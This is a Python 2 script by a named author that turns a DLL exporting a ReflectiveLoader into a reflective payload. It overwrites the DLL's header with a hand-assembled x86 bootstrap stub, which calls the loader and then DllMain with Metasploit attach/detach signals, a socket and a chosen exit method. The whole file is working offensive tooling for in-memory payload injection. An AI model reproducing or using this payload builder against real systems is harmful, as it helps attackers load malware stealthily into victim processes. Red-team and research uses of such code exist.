import sys, pefile, struct

__author__  = "Borja Merino Febrero"
__email__   = "bmerinofe@gmail.com"
__license__ = "GPL"
__version__ = "0.1"

class bcolors:
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    GREEN = '\033[32m'
    ENDC = '\033[0m'

def get_file_offset(pe):
  rva =''
  if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
    for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
      if "ReflectiveLoader" in export.name:
        rva = export.address
        print bcolors.GREEN + "[*] %s export Found! Ord:%s EntryPoint offset: %xh" % (export.name, export.ordinal, rva) + bcolors.ENDC
        break;

  if not rva:
    print bcolors.FAIL + "[!] Reflective export function not found :/" + bcolors.ENDC
    sys.exit(1)

  offset_va = rva - pe.get_section_by_rva(rva).VirtualAddress
  offset_file = offset_va + pe.get_section_by_rva(rva).PointerToRawData

  # Correct 7 bytes
  offset_file -= 7

  # Return little endian version
  return struct.pack("<I", offset_file).encode('hex')

def patch_stub(offset_file, exit_addr):
  stub = ("\x4D"                                    # dec ebp             ; M
          "\x5A"                                    # pop edx             ; Z
          "\xE8\x00\x00\x00\x00"                    # call 0              ; call nexmsn ls t instruction
          "\x5B"                                    # pop ebx             ; get our location (+7)
          "\x52"                                    # push edx            ; push edx back
          "\x45"                                    # inc ebp             ; restore ebp
          "\x55"                                    # push ebp            ; save ebp
          "\x89\xE5"                                # mov ebp, esp        ; setup fresh stack frame
          "\x81\xC3" + offset_file.decode('hex')  + # add ebx, 0x???????? ; add offset to ReflectiveLoader
          "\xFF\xD3"                                # call ebx            ; call ReflectiveLoader
          "\x89\xC3"                                # mov ebx, eax        ; save DllMain for second call
          "\x57"                                    # push edi            ; our socket
          "\x68\x04\x00\x00\x00"                    # push 0x4            ; signal we have attached
          "\x50"                                    # push eax            ; some value for hinstance
          "\xFF\xD0"                                # call eax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
          "\x68" + exit_addr +                      # push 0x????????     ; our EXITFUNC placeholder
          "\x68\x05\x00\x00\x00"                    # push 0x5            ; signal we have detached
          "\x50"                                    # push eax            ; some value for hinstance
          "\xFF\xD3")                               # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
  return stub


def main(argv):
  # Little endian addr
  exit_method = {'thread': '\xE0\x1D\x2A\x0A', 'seh': '\xFE\x0E\x32\xEA', 'process':'\xF0\xB5\xA2\x56'}
  exit_addr = exit_method["thread"]

  if len(sys.argv) == 1:
    print bcolors.GREEN + "Usage: python dllToReflective.py payload.dll [thread|seh|process]" + bcolors.ENDC
    sys.exit(1)

  if len(sys.argv) > 2:
    if sys.argv[2] not in exit_method:
      print bcolors.FAIL + "[!] Not valid exit method" + bcolors.ENDC
      sys.exit(1)
    else:
      exit_addr = exit_method[sys.argv[2]]

  dll = sys.argv[1]

  try:
    pe =  pefile.PE(dll)
    print bcolors.GREEN + "[*] %s loaded" % dll + bcolors.ENDC
  except IOError as e:
    print str(e)
    sys.exit(1)

  offset_file = get_file_offset(pe)
  stub = patch_stub(offset_file,exit_addr)

  src = file(dll,'rb')
  payload = src.read()

  # Relfective = Size payload + stub + (payload -stub)
  reflective_payload = struct.pack("<I",len(payload))  + stub + payload[len(stub):]

  dst = open('reflective.dll','wb')
  dst.write(reflective_payload)

  src.close()
  dst.close()
  print bcolors.BOLD + "[+] Patched! reflective.dll (%d bytes)." % (len(reflective_payload)) + bcolors.ENDC

if __name__ == '__main__':
  main(sys.argv[1:])
